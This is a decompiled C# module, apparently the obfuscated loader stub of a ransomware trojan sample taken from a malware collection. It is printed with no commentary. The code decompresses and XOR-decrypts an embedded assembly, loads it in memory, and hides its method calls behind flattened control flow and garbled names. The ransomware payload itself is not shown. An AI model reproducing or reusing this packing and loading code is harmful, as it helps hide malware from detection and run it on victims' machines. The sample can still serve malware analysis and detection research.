// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 591BD174-6BA7-4AF8-A4DB-5D88FD31BDF3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-2c01a4b5df598caa723ca49a0e4b85d0a6bc07036550fe1bdc6fe8c7ff4495d2.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Reflection.Emit;
using System.Text;

internal class \u003CModule\u003E
{
  static Dictionary<uint, object> ﮒ偺擐箆ᆔᡤಹӅ;
  static Stream \uFFFD๗栰\u2384쑦\uEF3Cᤝ線;
  static Assembly ꜝᎋ燌耤\uFE64죔뫒\uEC5A;

  static \u003CModule\u003E()
  {
    AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u003CModule\u003E.\uFFFD\uFFFD3e2\uFFFDI\uFFFD\uFFFD\u0015\uFFFD\u007EJ\u0026\u0022);
    \u003CModule\u003E.ﮒ偺擐箆ᆔᡤಹӅ = new Dictionary<uint, object>();
    \u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線 = (Stream) new MemoryStream();
    Assembly executingAssembly = Assembly.GetExecutingAssembly();
    int num = 4 - 9 - (6 - (3 + 7 + (9 - 6)));
    DeflateStream deflateStream;
    while (true)
    {
      switch (num)
      {
        case 1:
          byte[] buffer = new byte[4096];
          int count = deflateStream.Read(buffer, 0, 4096);
          do
          {
            \u003CModule\u003E.\uFFFD๗栰\u2384쑦\uEF3Cᤝ線.Write(buffer, 0, count);
            count = deflateStream.Read(buffer, 0, 4096);
          }
          while (count != 0);
          num = ~-12 - 3 - 4;
          continue;
        case 2:
          deflateStream = new DeflateStream(executingAssembly.GetManifestResourceStream(Encoding.UTF8.GetString(BitConverter.GetBytes(1816677393))), CompressionMode.Decompress);
          num = ~~(2 - (-6 + 7));
          continue;
        case 3:
          goto label_8;
        case 4:
          deflateStream.Dispose();
          紶自㰛\u32C9\uEA58ᖹ\uE826ꘀ.ꚹ需\uEBE7욠\uF633쉗俢ߜ();
          num = ~(-16 - -(6 + 5)) - 4;
          continue;
        default:
          ﵣ릉縟ꌟ\u2934㝰\uFFFD唊.\u26A8캢ꕿ\uF5DA쵾螐竳㬓();
          num = 3 - ~-1;
          continue;
      }
    }
label_8:;
  }

  internal static void 㣴\uA7D4뒩ᇆ\uFFFDཅ㻅ㆹ(RuntimeFieldHandle f)
  {
    FieldInfo fieldFromHandle = FieldInfo.GetFieldFromHandle(f);
    char[] chArray = new char[fieldFromHandle.Name.Length];
    int num1 = -~18 - 9;
    while (true)
    {
      int index1;
      int num2;
      do
      {
        ConstructorInfo con;
        Type[] parameterTypes;
        DynamicMethod dynamicMethod;
        ILGenerator ilGenerator;
        int num3;
        int num4;
        do
        {
          switch (num1)
          {
            case 1:
              ilGenerator = dynamicMethod.GetILGenerator();
              num1 = -(-6 - ~~3) - 2;
              continue;
            case 2:
              ilGenerator.Emit(OpCodes.Ldarg_S, num3);
              ++num3;
              num1 = ~(~3 + ~9);
              continue;
            case 3:
              fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldFromHandle.FieldType));
              return;
            case 4:
              num4 = con.DeclaringType.IsArray ? 1 : 0;
              num1 = 4 - --4;
              continue;
            case 5:
              goto label_8;
            case 6:
              goto label_9;
            case 7:
              goto label_12;
            case 8:
              goto label_13;
            case 9:
              goto label_14;
            case 10:
              goto label_15;
            case 11:
              goto label_17;
            case 12:
              goto label_18;
            case 13:
              if (num3 < parameterTypes.Length)
                goto case 2;
              else
                goto label_22;
            case 14:
              goto label_10;
            case 15:
              goto label_24;
            case 16:
              goto label_25;
            case 17:
              goto label_27;
            default:
              dynamicMethod = new DynamicMethod("", con.DeclaringType, parameterTypes, con.DeclaringType, true);
              goto case 1;
          }
        }
        while (num4 == 0);
        num1 = ~~~-12;
        continue;
label_8:
        byte[] numArray = Convert.FromBase64String(new string(chArray));
        con = fieldFromHandle.Module.ResolveMethod(BitConverter.ToInt32(numArray, 0) ^ 1219290083 | (int) numArray[4] << 24) as ConstructorInfo;
        ParameterInfo[] parameters = con.GetParameters();
        num1 = -(2 + 8 - --18);
        continue;
label_9:
        ++index1;
label_10:
        if (index1 >= parameters.Length)
        {
          num1 = -4 - (~(9 + 9) - 1);
          continue;
        }
        parameterTypes[index1] = parameters[index1].ParameterType;
        num1 = 9 - ~(4 - (5 + 7 - (6 - 2)));
        continue;
label_12:
        num3 = 0;
        num1 = -(-3 - --6);
        continue;
label_13:
        parameterTypes = new Type[parameters.Length];
        num1 = ~~--17;
        continue;
label_14:
        num1 = 15 - 2;
        continue;
label_15:
        int index2 = 0;
        goto label_19;
label_17:
        dynamicMethod = new DynamicMethod("", con.DeclaringType, parameterTypes, fieldFromHandle.DeclaringType, true);
        num1 = ~~(-5 + (3 + 4) - 1);
        continue;
label_18:
        ++index2;
label_19:
        if (index2 < chArray.Length)
        {
          chArray[index2] = (char) ((uint) (byte) fieldFromHandle.Name[index2] ^ (uint) index2);
          num1 = -(2 - 3) - 2 - ~6 + 6;
          continue;
        }
        num1 = ~-(12 - (-3 - -9));
        continue;
label_22:
        ilGenerator.Emit(OpCodes.Newobj, con);
        num1 = ----15;
        continue;
label_24:
        ilGenerator.Emit(OpCodes.Ret);
        num1 = -~8 - 4 + -9 + 7;
        continue;
label_25:
        num2 = con.DeclaringType.IsInterface ? 1 : 0;
        num1 = -~(8 + 5 - (6 + 8) - -11);
      }
      while (num2 != 0);
      num1 = 2 - (--2 - 4);
      continue;
label_27:
      index1 = 0;
      num1 = -(-5 - (9 + (5 - 3)) - (3 - 5));
    }
  }

  internal static void ʌ穜けꍩ杪䦒뭘냞(RuntimeFieldHandle f)
  {
    FieldInfo fieldFromHandle = FieldInfo.GetFieldFromHandle(f);
    char[] chArray = new char[fieldFromHandle.Name.Length];
    int index1 = 0;
    int num1 = 5 - -(-6 - ~(9 + 5));
    while (true)
    {
      int num2;
      do
      {
        byte[] numArray;
        MethodInfo methodInfo;
        int num3;
        ParameterInfo[] parameters;
        Type[] parameterTypes;
        int index2;
        DynamicMethod dynamicMethod;
        ILGenerator ilGenerator;
        switch (num1)
        {
          case 1:
            ilGenerator = dynamicMethod.GetILGenerator();
            num3 = 0;
            goto case 13;
          case 2:
            return;
          case 3:
            if (num3 == 0)
            {
              num1 = -~(4 + -(2 - 7));
              continue;
            }
            goto label_20;
          case 4:
            parameters = methodInfo.GetParameters();
            parameterTypes = new Type[parameters.Length + 1];
            parameterTypes[0] = typeof (object);
            index2 = 0;
            num1 = ~~--6;
            continue;
          case 5:
            parameterTypes[index2 + 1] = parameters[index2].ParameterType;
            ++index2;
            goto case 6;
          case 6:
            if (index2 >= parameters.Length)
            {
              if (!methodInfo.DeclaringType.IsInterface)
              {
                num1 = 9 - (--8 + ~7);
                continue;
              }
              break;
            }
            goto case 5;
          case 7:
            dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, methodInfo.DeclaringType, true);
            goto case 1;
          case 8:
            ilGenerator.Emit(OpCodes.Ret);
            fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldFromHandle.FieldType));
            num1 = 5 - 3;
            continue;
          case 9:
            if (!methodInfo.DeclaringType.IsArray)
              goto case 7;
            else
              break;
          case 10:
            ilGenerator.Emit(OpCodes.Castclass, methodInfo.DeclaringType);
            goto label_20;
          case 11:
            ++index1;
            num1 = ~~(0 + (9 - 4 + ~4));
            continue;
          case 12:
            chArray[index1] = (char) ((uint) (byte) fieldFromHandle.Name[index1] ^ (uint) index1);
            num1 = 4 - ~~-7;
            continue;
          case 13:
            if (num3 < parameterTypes.Length)
            {
              ilGenerator.Emit(OpCodes.Ldarg, num3);
              num1 = -~2 - 2 - -2;
              continue;
            }
            ilGenerator.Emit(((int) numArray[0] & 128) != 0 ? OpCodes.Callvirt : OpCodes.Call, methodInfo);
            num1 = --~-9;
            continue;
          case 14:
            num1 = 8 - 15 - ~6;
            continue;
          case 15:
            return;
          case 16:
            fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldFromHandle.FieldType, methodInfo));
            num1 = ~(-19 - 3) - 6;
            continue;
          case 17:
            num2 = methodInfo.IsStatic ? 1 : 0;
            num1 = -(~7 + (6 - 2));
            continue;
          default:
            if (index1 >= chArray.Length)
            {
              numArray = Convert.FromBase64String(new string(chArray));
              methodInfo = fieldFromHandle.Module.ResolveMethod(BitConverter.ToInt32(numArray, 1) ^ 2057602157 | ((int) numArray[0] & (int) sbyte.MaxValue) << 24) as MethodInfo;
              num1 = 15 - (9 + ~8) - ~8 - 7;
              continue;
            }
            goto case 12;
        }
        dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, fieldFromHandle.DeclaringType, true);
        num1 = -6 + ~5 - -13;
        continue;
label_20:
        ++num3;
        num1 = -~(19 - 7);
      }
      while (num2 == 0);
      num1 = ~(~13 - 3);
    }
  }

  internal static Assembly \uFFFD\uFFFD3e2\uFFFDI\uFFFD\uFFFD\u0015\uFFFD\u007EJ\u0026\u0022(
    object sender,
    ResolveEventArgs args)
  {
    if ((object) \u003CModule\u003E.ꜝᎋ燌耤\uFE64죔뫒\uEC5A == null)
    {
      using (BinaryReader binaryReader = new BinaryReader((Stream) new DeflateStream(typeof (\u003CModule\u003E).Assembly.GetManifestResourceStream("�8�}E8nD��˥7rW\u0015"), CompressionMode.Decompress)))
      {
        byte[] numArray = binaryReader.ReadBytes(binaryReader.ReadInt32());
        byte num1 = 93;
        int index = 0;
        while (true)
        {
          int num2;
          if (index < numArray.Length)
          {
            numArray[index] = (byte) ((uint) numArray[index] ^ (uint) num1);
            num2 = -~(3 - ~-3);
          }
          else
            goto label_7;
label_4:
          while (true)
          {
            switch (num2)
            {
              case 1:
                goto label_13;
              case 2:
                num1 = (byte) ((int) num1 * 93 % 256);
                num2 = 4 - (8 + 9 - --13);
                continue;
              case 3:
                \u003CModule\u003E.ꜝᎋ燌耤\uFE64죔뫒\uEC5A = Assembly.Load(numArray);
                Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
                num2 = ~-(10 - (8 - 6 - ~5));
                continue;
              default:
                goto label_5;
            }
          }
label_5:
          ++index;
          continue;
label_7:
          num2 = -15 - (-2 + -3) - ~5 + 7;
          goto label_4;
        }
      }
    }
label_13:
    return Array.IndexOf<string>(\u003CModule\u003E.ꜝᎋ燌耤\uFE64죔뫒\uEC5A.GetManifestResourceNames(), args.Name) == -1 ? (Assembly) null : \u003CModule\u003E.ꜝᎋ燌耤\uFE64죔뫒\uEC5A;
  }
}
